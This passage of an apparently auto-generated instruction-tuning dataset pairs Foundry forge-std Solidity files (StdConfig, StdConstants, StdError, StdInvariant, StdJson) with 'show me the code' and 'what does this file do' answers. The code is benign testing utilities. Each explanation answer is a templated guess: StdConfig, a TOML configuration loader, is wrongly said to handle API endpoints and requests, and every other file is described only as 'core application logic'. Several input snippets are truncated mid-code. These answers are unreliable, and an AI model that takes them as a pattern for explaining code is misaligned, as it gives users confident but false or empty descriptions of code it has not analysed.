(ARRAYS) --------------------------------------------\n\n    /// @notice Sets a boolean array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bool[] memory value) public {\n        Type memory ty = Type(TypeKind.Bool, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, vm.toString(value[i]));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a boolean array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bool[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets an address array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, address[] memory value) public {\n        Type memory ty = Type(TypeKind.Address, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, _quote(vm.toString(value[i])));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets an address array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, address[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a bytes32 array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bytes32[] memory value) public {\n        Type memory ty = Type(TypeKind.Bytes32, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, _quote(vm.toString(value[i])));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a bytes32 array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bytes32[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a uint256 array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, uint256[] memory value) public {\n        Type memory ty = Type(TypeKind.Uint256, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, vm.toString(value[i]));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a uint256 array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, uint256[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a int256 array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, int256[] memory value) public {\n        Type memory ty = Type(TypeKind.Int256, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, vm.toString(value[i]));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a int256 array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, int256[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a string array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, string[] memory value) public {\n        Type memory ty = Type(TypeKind.String, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, _quote(value[i]));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a string array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, string[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n\n    /// @notice Sets a bytes array for a given key and chain ID.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(uint256 chainId, string memory key, bytes[] memory value) public {\n        Type memory ty = Type(TypeKind.Bytes, true);\n        _ensureTypeConsistency(chainId, key, ty);\n        _dataOf[chainId][key] = abi.encode(value);\n        if (_writeToFile) {\n            string memory json = \"[\";\n            for (uint256 i = 0; i < value.length; i++) {\n                json = string.concat(json, _quote(vm.toString(value[i])));\n                if (i < value.length - 1) json = string.concat(json, \",\");\n            }\n            json = string.concat(json, \"]\");\n            _writeToToml(chainId, ty.kind.toTomlKey(), key, json);\n        }\n    }\n\n    /// @notice Sets a bytes array for a given key on the current chain.\n    /// @dev    Sets the cached value in storage and writes the change back to the TOML file if `autoWrite` is enabled.\n    function set(string memory key, bytes[] memory value) public {\n        set(vm.getChainId(), key, value);\n    }\n}\n\n```"}
{"instruction": "What does the file StdConfig.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {VmSafe} from \"./Vm.sol\";\nimport {Variable, Type, TypeKind, LibVariable} from \"./LibVariable.sol\";\n\n/// @notice  A contract that parses a toml configuration file and load its\n///          variables into storage, automatically casting them, on deployment.\n///\n/// @dev     This contract assumes a toml structure where top-level keys\n///          represent chain ids or aliases. Under each chain key, variables are\n///          organized by type in separate sub-tables like `[<chain>.<type>]`, where\n///          type must be: `bool`, `address`, `bytes32`, `uint`, `Ã¬nt`, `string`, or `bytes`.\n///\n///          Supported format:\n///          ```\n///          [mainnet]\n///          endpoint_url = \"${MAINNET_RPC}\"\n///\n///          [mainnet.bool]\n///          is_live = true\n///\n///          [mainnet.address]\n///          weth = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\"\n///          whitelisted_admins = [\n///             \"${MAINNET_ADMIN}\",\n///             \"0x00000000000000000000000000000000deadbeef\",\n///             \"0x000000000000000000000000000000c0ffeebabe\"\n///          ]\n///\n///          [mainnet.uint]\n///          important_number = 123\n///          ```\ncontract StdConfig {\n    using LibVariable for Type;\n    using LibVariable for TypeKind;\n\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    /// @dev Types: `bool`, `address`, `bytes32`, `uint`, `Ã¬nt`, `string`, `bytes`.\n    uint8 private constant NUM_TYPES = 7;\n\n    // -- ERRORS ---------------------------------------------------------------\n\n    error AlreadyInitialized(string key);\n    error InvalidChainKey(string aliasOrId);\n    error ChainNotInitialized(uint256 chainId);\n    error UnableToParseVariable(string key);\n    error WriteToFileInForbiddenCtxt();\n\n    // -- STORAGE (CACHE FROM CONFIG FILE) ------------------------------------\n\n    /// @dev Path to the loaded TOML configuration fil\n```", "output": "This file `StdConfig.sol` is part of the src project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for StdConstants.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdConstants.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IMulticall3} from \"./interfaces/IMulticall3.sol\";\nimport {Vm} from \"./Vm.sol\";\n\nlibrary StdConstants {\n    /// @dev Cheat code address.\n    /// Calculated as `address(uint160(uint256(keccak256(\"hevm cheat code\"))))`.\n    Vm internal constant VM = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    /// @dev console.sol and console2.sol work by executing a staticcall to this address.\n    /// Calculated as `address(uint160(uint88(bytes11(\"console.log\"))))`.\n    address internal constant CONSOLE = 0x000000000000000000636F6e736F6c652e6c6f67;\n    /// @dev Used when deploying with create2.\n    /// Taken from https://github.com/Arachnid/deterministic-deployment-proxy.\n    address internal constant CREATE2_FACTORY = 0x4e59b44847b379578588920cA78FbF26c0B4956C;\n    /// @dev The default address for tx.origin and msg.sender.\n    /// Calculated as `address(uint160(uint256(keccak256(\"foundry default caller\"))))`.\n    address internal constant DEFAULT_SENDER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;\n    /// @dev The address of the first contract `CREATE`d by a running test contract.\n    /// When running tests, each test contract is `CREATE`d by `DEFAULT_SENDER` with nonce 1.\n    /// Calculated as `VM.computeCreateAddress(VM.computeCreateAddress(DEFAULT_SENDER, 1), 1)`.\n    address internal constant DEFAULT_TEST_CONTRACT = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;\n    /// @dev Deterministic deployment address of the Multicall3 contract.\n    /// Taken from https://www.multicall3.com.\n    IMulticall3 internal constant MULTICALL3_ADDRESS = IMulticall3(0xcA11bde05977b3631167028862bE2a173976CA11);\n    /// @dev The order of the secp256k1 curve.\n    uint256 internal constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n}\n\n```"}
{"instruction": "What does the file StdConstants.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IMulticall3} from \"./interfaces/IMulticall3.sol\";\nimport {Vm} from \"./Vm.sol\";\n\nlibrary StdConstants {\n    /// @dev Cheat code address.\n    /// Calculated as `address(uint160(uint256(keccak256(\"hevm cheat code\"))))`.\n    Vm internal constant VM = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    /// @dev console.sol and console2.sol work by executing a staticcall to this address.\n    /// Calculated as `address(uint160(uint88(bytes11(\"console.log\"))))`.\n    address internal constant CONSOLE = 0x000000000000000000636F6e736F6c652e6c6f67;\n    /// @dev Used when deploying with create2.\n    /// Taken from https://github.com/Arachnid/deterministic-deployment-proxy.\n    address internal constant CREATE2_FACTORY = 0x4e59b44847b379578588920cA78FbF26c0B4956C;\n    /// @dev The default address for tx.origin and msg.sender.\n    /// Calculated as `address(uint160(uint256(keccak256(\"foundry default caller\"))))`.\n    address internal constant DEFAULT_SENDER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;\n    /// @dev The address of the first contract `CREATE`d by a running test contract.\n    /// When running tests, each test contract is `CREATE`d by `DEFAULT_SENDER` with nonce 1.\n    /// Calculated as `VM.computeCreateAddress(VM.computeCreateAddress(DEFAULT_SENDER, 1), 1)`.\n    address internal constant DEFAULT_TEST_CONTRACT = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;\n    /// @dev Deterministic deployment address of the Multicall3 contract.\n    /// Taken from https://www.multicall3.com.\n    IMulticall3 internal constant MULTICALL3_ADDRESS = IMulticall3(0xcA11bde05977b3631167028862bE2a173976CA11);\n    /// @dev The order of the secp256k1 curve.\n    uint256 internal constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n}\n\n```", "output": "This file `StdConstants.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdError.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdError.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\n// Panics work for versions >=0.8.0, but we lowered the pragma to make this compatible with Test\npragma solidity >=0.8.13 <0.9.0;\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n}\n\n```"}
{"instruction": "What does the file StdError.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\n// Panics work for versions >=0.8.0, but we lowered the pragma to make this compatible with Test\npragma solidity >=0.8.13 <0.9.0;\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n}\n\n```", "output": "This file `StdError.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdInvariant.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdInvariant.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nabstract contract StdInvariant {\n    struct FuzzSelector {\n        address addr;\n        bytes4[] selectors;\n    }\n\n    struct FuzzArtifactSelector {\n        string artifact;\n        bytes4[] selectors;\n    }\n\n    struct FuzzInterface {\n        address addr;\n        string[] artifacts;\n    }\n\n    address[] private _excludedContracts;\n    address[] private _excludedSenders;\n    address[] private _targetedContracts;\n    address[] private _targetedSenders;\n\n    string[] private _excludedArtifacts;\n    string[] private _targetedArtifacts;\n\n    FuzzArtifactSelector[] private _targetedArtifactSelectors;\n\n    FuzzSelector[] private _excludedSelectors;\n    FuzzSelector[] private _targetedSelectors;\n\n    FuzzInterface[] private _targetedInterfaces;\n\n    // Functions for users:\n    // These are intended to be called in tests.\n\n    function excludeContract(address newExcludedContract_) internal {\n        _excludedContracts.push(newExcludedContract_);\n    }\n\n    function excludeSelector(FuzzSelector memory newExcludedSelector_) internal {\n        _excludedSelectors.push(newExcludedSelector_);\n    }\n\n    function excludeSender(address newExcludedSender_) internal {\n        _excludedSenders.push(newExcludedSender_);\n    }\n\n    function excludeArtifact(string memory newExcludedArtifact_) internal {\n        _excludedArtifacts.push(newExcludedArtifact_);\n    }\n\n    function targetArtifact(string memory newTargetedArtifact_) internal {\n        _targetedArtifacts.push(newTargetedArtifact_);\n    }\n\n    function targetArtifactSelector(FuzzArtifactSelector memory newTargetedArtifactSelector_) internal {\n        _targetedArtifactSelectors.push(newTargetedArtifactSelector_);\n    }\n\n    function targetContract(address newTargetedContract_) internal {\n        _targetedContracts.push(newTargetedContract_);\n    }\n\n    function targetSelector(FuzzSelector memory newTargetedSelector_) internal {\n        _targetedSelectors.push(newTargetedSelector_);\n    }\n\n    function targetSender(address newTargetedSender_) internal {\n        _targetedSenders.push(newTargetedSender_);\n    }\n\n    function targetInterface(FuzzInterface memory newTargetedInterface_) internal {\n        _targetedInterfaces.push(newTargetedInterface_);\n    }\n\n    // Functions for forge:\n    // These are called by forge to run invariant tests and don't need to be called in tests.\n\n    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n    function excludeSelectors() public view returns (FuzzSelector[] memory excludedSelectors_) {\n        excludedSelectors_ = _excludedSelectors;\n    }\n\n    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n    function targetArtifactSelectors() public view returns (FuzzArtifactSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n}\n\n```"}
{"instruction": "What does the file StdInvariant.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nabstract contract StdInvariant {\n    struct FuzzSelector {\n        address addr;\n        bytes4[] selectors;\n    }\n\n    struct FuzzArtifactSelector {\n        string artifact;\n        bytes4[] selectors;\n    }\n\n    struct FuzzInterface {\n        address addr;\n        string[] artifacts;\n    }\n\n    address[] private _excludedContracts;\n    address[] private _excludedSenders;\n    address[] private _targetedContracts;\n    address[] private _targetedSenders;\n\n    string[] private _excludedArtifacts;\n    string[] private _targetedArtifacts;\n\n    FuzzArtifactSelector[] private _targetedArtifactSelectors;\n\n    FuzzSelector[] private _excludedSelectors;\n    FuzzSelector[] private _targetedSelectors;\n\n    FuzzInterface[] private _targetedInterfaces;\n\n    // Functions for users:\n    // These are intended to be called in tests.\n\n    function excludeContract(address newExcludedContract_) internal {\n        _excludedContracts.push(newExcludedContract_);\n    }\n\n    function excludeSelector(FuzzSelector memory newExcludedSelector_) internal {\n        _excludedSelectors.push(newExcludedSelector_);\n    }\n\n    function excludeSender(address newExcludedSender_) internal {\n        _excludedSenders.push(newExcludedSender_);\n    }\n\n    function excludeArtifact(string memory newExcludedArtifact_) internal {\n        _excludedArtifacts.push(newExcludedArtifact_);\n    }\n\n    function targetArtifact(string memory newTargetedArtifact_) internal {\n        _targetedArtifacts.push(newTargetedArtifact_);\n    }\n\n    function targetArtifactSelector(FuzzArtifactSelector memory newTargetedArtifactSelector_) internal {\n        _targetedArtifactSelectors.push(newTargetedArtifactSelector_);\n    }\n\n    function targetContract(address newTargetedContract_) internal {\n        _targetedContracts.push(newTargetedContract_);\n    }\n\n    function targetSelector(FuzzSelector memory newTargetedSelector_) internal {\n        _targetedSele\n```", "output": "This file `StdInvariant.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdJson.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdJson.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n// Helpers for parsing and writing JSON files\n// To parse:\n// ```\n// using stdJson for string;\n// string memory json = vm.readFile(\"<some_path>\");\n// json.readUint(\"<json_path>\");\n// ```\n// To write:\n// ```\n// using stdJson for string;\n// string memory json = \"json\";\n// json.serialize(\"a\", uint256(123));\n// string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n// string memory finalJson = json.serialize(\"c\", semiFinal);\n// finalJson.write(\"<some_path>\");\n// ```\n\nlibrary stdJson {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function keyExists(string memory json, string memory key) internal view returns (bool) {\n        return vm.keyExistsJson(json, key);\n    }\n\n    function parseRaw(string memory json, string memory key) internal pure returns (bytes memory) {\n        return vm.parseJson(json, key);\n    }\n\n    function readUint(string memory json, string memory key) internal pure returns (uint256) {\n        return vm.parseJsonUint(json, key);\n    }\n\n    function readUintArray(string memory json, string memory key) internal pure returns (uint256[] memory) {\n        return vm.parseJsonUintArray(json, key);\n    }\n\n    function readInt(string memory json, string memory key) internal pure returns (int256) {\n        return vm.parseJsonInt(json, key);\n    }\n\n    function readIntArray(string memory json, string memory key) internal pure returns (int256[] memory) {\n        return vm.parseJsonIntArray(json, key);\n    }\n\n    function readBytes32(string memory json, string memory key) internal pure returns (bytes32) {\n        return vm.parseJsonBytes32(json, key);\n    }\n\n    function readBytes32Array(string memory json, string memory key) internal pure returns (bytes32[] memory) {\n        return vm.parseJsonBytes32Array(json, key);\n    }\n\n    function readString(string memory json, string memory key) internal pure returns (string memory) {\n        return vm.parseJsonString(json, key);\n    }\n\n    function readStringArray(string memory json, string memory key) internal pure returns (string[] memory) {\n        return vm.parseJsonStringArray(json, key);\n    }\n\n    function readAddress(string memory json, string memory key) internal pure returns (address) {\n        return vm.parseJsonAddress(json, key);\n    }\n\n    function readAddressArray(string memory json, string memory key) internal pure returns (address[] memory) {\n        return vm.parseJsonAddressArray(json, key);\n    }\n\n    function readBool(string memory json, string memory key) internal pure returns (bool) {\n        return vm.parseJsonBool(json, key);\n    }\n\n    function readBoolArray(string memory json, string memory key) internal pure returns (bool[] memory) {\n        return vm.parseJsonBoolArray(json, key);\n    }\n\n    function readBytes(string memory json, string memory key) internal pure returns (bytes memory) {\n        return vm.parseJsonBytes(json, key);\n    }\n\n    function readBytesArray(string memory json, string memory key) internal pure returns (bytes[] memory) {\n        return vm.parseJsonBytesArray(json, key);\n    }\n\n    function readUintOr(string memory json, string memory key, uint256 defaultValue) internal view returns (uint256) {\n        return keyExists(json, key) ? readUint(json, key) : defaultValue;\n    }\n\n    function readUintArrayOr(string memory json, string memory key, uint256[] memory defaultValue)\n        internal\n        view\n        returns (uint256[] memory)\n    {\n        return keyExists(json, key) ? readUintArray(json, key) : defaultValue;\n    }\n\n    function readIntOr(string memory json, string memory key, int256 defaultValue) internal view returns (int256) {\n        return keyExists(json, key) ? readInt(json, key) : defaultValue;\n    }\n\n    function readIntArrayOr(string memory json, string memory key, int256[] memory defaultValue)\n        internal\n        view\n        returns (int256[] memory)\n    {\n        return keyExists(json, key) ? readIntArray(json, key) : defaultValue;\n    }\n\n    function readBytes32Or(string memory json, string memory key, bytes32 defaultValue)\n        internal\n        view\n        returns (bytes32)\n    {\n        return keyExists(json, key) ? readBytes32(json, key) : defaultValue;\n    }\n\n    function readBytes32ArrayOr(string memory json, string memory key, bytes32[] memory defaultValue)\n        internal\n        view\n        returns (bytes32[] memory)\n    {\n        return keyExists(json, key) ? readBytes32Array(json, key) : defaultValue;\n    }\n\n    function readStringOr(string memory json, string memory key, string memory defaultValue)\n        internal\n        view\n        returns (string memory)\n    {\n        return keyExists(json, key) ? readString(json, key) : defaultValue;\n    }\n\n    function readStringArrayOr(string memory json, string memory key, string[] memory defaultValue)\n        internal\n        view\n        returns (string[] memory)\n    {\n        return keyExists(json, key) ? readStringArray(json, key) : defaultValue;\n    }\n\n    function readAddressOr(string memory json, string memory key, address defaultValue)\n        internal\n        view\n        returns (address)\n    {\n        return keyExists(json, key) ? readAddress(json, key) : defaultValue;\n    }\n\n    function readAddressArrayOr(string memory json, string memory key, address[] memory defaultValue)\n        internal\n        view\n        returns (address[] memory)\n    {\n        return keyExists(json, key) ? readAddressArray(json, key) : defaultValue;\n    }\n\n    function readBoolOr(string memory json, string memory key, bool defaultValue) internal view returns (bool) {\n        return keyExists(json, key) ? readBool(json, key) : defaultValue;\n    }\n\n    function readBoolArrayOr(string memory json, string memory key, bool[] memory defaultValue)\n        internal\n        view\n        returns (bool[] memory)\n    {\n        return keyExists(json, key) ? readBoolArray(json, key) : defaultValue;\n    }\n\n    function readBytesOr(string memory json, string memory key, bytes memory defaultValue)\n        internal\n        view\n        returns (bytes memory)\n    {\n        return keyExists(json, key) ? readBytes(json, key) : defaultValue;\n    }\n\n    function readBytesArrayOr(string memory json, string memory key, bytes[] memory defaultValue)\n        internal\n        view\n        returns (bytes[] memory)\n    {\n        return keyExists(json, key) ? readBytesArray(json, key) : defaultValue;\n    }\n\n    function serialize(string memory jsonKey, string memory rootObject) internal returns (string memory) {\n        return vm.serializeJson(jsonKey, rootObject);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bool value) internal returns (string memory) {\n        return vm.serializeBool(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bool[] memory value) internal returns (string memory) {\n        return vm.serializeBool(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, uint256 value) internal returns (string memory) {\n        return vm.serializeUint(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, uint256[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeUint(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, int256 value) internal returns (string memory) {\n        return vm.serializeInt(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, int256[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeInt(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, address value) internal returns (string memory) {\n        return vm.serializeAddress(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, address[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeAddress(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes32 value) internal returns (string memory) {\n        return vm.serializeBytes32(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes32[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeBytes32(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes memory value) internal returns (string memory) {\n        return vm.serializeBytes(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeBytes(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, string memory value) internal returns (string memory) {\n        return vm.serializeString(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, string[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeString(jsonKey, key, value);\n    }\n\n    function write(string memory jsonKey, string memory path) internal {\n        vm.writeJson(jsonKey, path);\n    }\n\n    function write(string memory jsonKey, string memory path, string memory valueKey) internal {\n        vm.writeJson(jsonKey, path, valueKey);\n    }\n}\n\n```"}
{"instruction": "What does the file StdJson.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n// Helpers for parsing and writing JSON files\n// To parse:\n// ```\n// using stdJson for string;\n// string memory json = vm.readFile(\"<some_path>\");\n// json.readUint(\"<json_path>\");\n// ```\n// To write:\n// ```\n// using stdJson for string;\n// string memory json = \"json\";\n// json.serialize(\"a\", uint256(123));\n// string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n// string memory finalJson = json.serialize(\"c\", semiFinal);\n// finalJson.write(\"<some_path>\");\n// ```\n\nlibrary stdJson {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function keyExists(string memory json, string memory key) internal view returns (bool) {\n        return vm.keyExistsJson(json, key);\n    }\n\n    function parseRaw(string memory json, string memory key) internal pure returns (bytes memory) {\n        return vm.parseJson(json, key);\n    }\n\n    function readUint(string memory json, string memory key) internal pure returns (uint256) {\n        return vm.parseJsonUint(json, key);\n    }\n\n    function readUintArray(string memory json, string memory key) internal pure returns (uint256[] memory) {\n        return vm.parseJsonUintArray(json, key);\n    }\n\n    function readInt(string memory json, string memory key) internal pure returns (int256) {\n        return vm.parseJsonInt(json, key);\n    }\n\n    function readIntArray(string memory json, string memory key) internal pure returns (int256[] memory) {\n        return vm.parseJsonIntArray(json, key);\n    }\n\n    function readBytes32(string memory json, string memory key) internal pure returns (bytes32) {\n        return vm.parseJsonBytes32(json, key);\n    }\n\n    function readBytes32Array(string memory json, string memory key) internal pure returns (bytes32[] memory) {\n        return vm.parseJsonBytes32Array(json, key);\n    }\n\n    function readString(string memory json, string memory key) \n```", "output": "This file `StdJson.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
